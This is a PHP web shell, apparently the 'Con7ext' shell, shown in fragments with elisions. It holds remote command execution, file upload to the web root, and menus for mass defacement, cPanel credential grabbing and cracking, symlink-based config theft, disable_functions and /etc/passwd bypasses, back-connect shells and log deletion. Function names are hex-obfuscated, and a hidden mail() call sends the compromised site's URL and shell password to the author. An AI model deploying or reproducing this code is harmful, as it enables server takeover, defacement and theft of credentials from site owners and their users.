...
function exe($cmd) {
	if(function_exists('system')) { 		
		...
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	}  elseif (function_exists('proc_open')) { // New condition added 		
		...
		if (is_resource($process)) { 			
			...
			fclose($pipes[0]);  // Close the pipes 			
			fclose($pipes[1]); 			
			fclose($pipes[2]);  // Close the pipes 			
			$return_value = proc_close($process);  // Close the process and return its exit code 			
			return $output; 		
		} 	
	} 
}
...
$dir = str_replace("\\","/",$dir);
$sys = php_uname();
$author = 'dmFsaXJ4YzBkZUB6b2hvLmNvbQ==';
...
$contact = base64_decode($author);
$_COPY = base64_decode($_c7e);
if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
            $seges = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['ix_file']['name']);
			if(@"\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($_FILES['ix_file']['tmp_name'], "$path/".$seges."")) {
				$act = "<font color=green>Uploaded!</font> at <i><b>$path/".$seges."</b></i>";
			} else {
				$act = "<font color=red>Failed to upload file</font>";
			}
		} else {
            $seges2 = "\x62\x61\x73\x65\x6e\x61\x6d\x65"($_FILES['ix_file']['name']);
			$root = $_SERVER['DOCUMENT_ROOT']."/".$seges2;
			$web = $_SERVER['HTTP_HOST']."/".$seges2;
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@"\x6d\x6f\x76\x65\x5f\x75\x70\x6c\x6f\x61\x64\x65\x64\x5f\x66\x69\x6c\x65"($_FILES['ix_file']['tmp_name'], $root)) {
...
<center>
<ul>
<a href='?jemboeet=$path&jancok=cmd'>Command</a>
<a href='?jemboeet=$path&jancok=mass_deface'>Mass</a>
<a href='?jemboeet=$path&jancok=adminer'>Adminer</a>
<a href='?jemboeet=$path&jancok=jumping'>Jumping</a>
<a href='?jemboeet=$path&jancok=cpanel'>Grab Cpanel</a>
<a href='?jemboeet=$path&jancok=cgi'>Cgi Telnet</a>
<a href='?jemboeet=$path&config=grabber'>Config Tools</a>
<a href='?jemboeet=$path&mass=changer'>Mass User Changer</a>
<a href='?jemboeet=$path&backconnect=tool'>Back Connect Tools</a>
<a href='?jemboeet=$path&symlink=tool'>Symlink Tools</a>
<a href='?jemboeet=$path&bypass=tool'>Bypass Tools</a></br></ul>
<a href='?jemboeet=$path&jancok=loghunter'>Log Hunter</a>
<a href='?jemboeet=$path&jancok=portsc'>Port Scanner</a>
<a href='?jemboeet=$path&jancok=bconnect'>Simple Back-Connect</a>
<a href='?jemboeet=$path&jancok=auto_wp_title'>Auto Edit Title WP</a>
<a href='?jemboeet=$path&jancok=zip'>Zip Menu</a>
<a href='?jemboeet=$path&jancok=cpbf'>Cpanel Cracker</a>
</ul></div></center>";
echo "<div id='nav'>
<a class='nav-fokus' href='?'><b>Home</b></a><a class='nav-fokus' href='?jemboeet=$path&con7ext=info'><b>System Info</b></a><a class='nav-fokus' href='?jemboeet=$path&delete=logs'><b>Delete Logs</b></a><a class='nav-fokus' href='?jemboeet=$path&kill=self'><b>Kill Self</b></a><a class='nav-fokus' href='?jemboeet=$path&jancok=logout'><b>Log-Out</b></a></div>";
echo '
<br>
<hr color="#191919">
<br>
...
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?jemboeet=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?jemboeet=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
...
<center>
System : '.$sys.'<br>
HDD : '.hdd(disk_free_space("/")).' / '.hdd(disk_total_space("/")).'<br>
IP : '.$ip.'<br>
Safe Mode : '.$sm.'<br>
...
Home_root : '.$home_r.'
	...
	echo"</td></tr></table>";
        ...
        echo "<div id='menu'><center><a href='?jemboeet=$path&bypass=disablefunc'>Disable Functions</a><a href='?jemboeet=$path&bypass=passwd'>Bypass /etc/passwd</a><a href='?jemboeet=$path&bypass=vhostss'>Bypass Vhosts</a></div>";
	...
	chmod($file_sym, 0755);
        ...
        echo "<div id='menu'><center><a href='?jemboeet=$path&symlink=server'>Symlink Server</a><a href='?jemboeet=$path&symlink=404'>Symlink 404</a><a href='?jemboeet=$path&symlink=python'>Bypass Symlink Python</a></div>";
	echo "<br><center>Done ... <a href='con7ext_sympy/brudulsympy/' target='_blank'>Klik Here</a>";
} elseif($_GET['bypass'] == 'disablefunc'){
                echo "<div id='menu'><center><a href='?jemboeet=$path&bypass=disablefunc'>Disable Functions</a><a href='?jemboeet=$path&bypass=passwd'>Bypass /etc/passwd</a><a href='?jemboeet=$path&bypass=vhosts'>Bypass Vhosts</a></div>";
		echo "<br><br><center>";
...
echo "<a href='?jemboeet=$path&bypass=disablefunc'>Disable Functions</a><a href='?jemboeet=$path&bypass=passwd'>Bypass /etc/passwd</a><a href='?jemboeet=$path&bypass=vhosts'>Bypass Vhosts</a></div>";
} elseif($_GET['symlink'] == 'tool'){
echo "<div id='menu'><center>";
echo "<a href='?jemboeet=$path&symlink=server'>Symlink Server</a><a href='?jemboeet=$path&symlink=404'>Symlink 404</a><a href='?jemboeet=$path&symlink=python'>Bypass Symlink Python</a></div>";
...
mail($author,'[Dont Edit!]','URL : '.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].' PASSWORD : '.$auth_pass.'','admin@google.com');
##httaces
if($d0mains){
...
@symlink($config,"con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/con7ext.txt");
            ...
            echo "<center><a href='?jemboeet=$path/con7ext_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
...
} elseif($_GET['jancok'] == 'auto_wp_title') {
	if($_POST['hajar']) {
		...
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_con7ext_jump) {
				...
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=white>R</font>] <a href='?jemboeet=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=white>RW</font>] <a href='?jemboeet=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
...
} elseif($_GET['jancok'] == 'mass_deface') {
...
if(isset(${"\x5f\x50\x4f\x53\x54"}['src'])){
$fp = fopen($_POST['path'],'w');
$newew = "\x73\x74\x72\x69\x70\x73\x6c\x61\x73\x68\x65\x73"(${"\x5f\x50\x4f\x53\x54"}['src']);
if(fwrite($fp,$newew)){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br/>';
...
echo '<tr>
<td><a href="?jemboeet='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
...
echo '</center></td>
<td><center><form method="POST" action="?option&jemboeet='.$path.'">
<select name="opt">
...
echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&jemboeet='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
...
echo '<br><br><hr color="#191919"><br><center><br/>Copyright &copy '.date("Y").' <a href="https://www.facebook.com/tokeichun69" target="_blank">Con7ext</a> - <a href="https://www.facebook.com/xaisyndicate" target="_blank">'.$_COPY.'</a></center>
</body>
</html>';
?>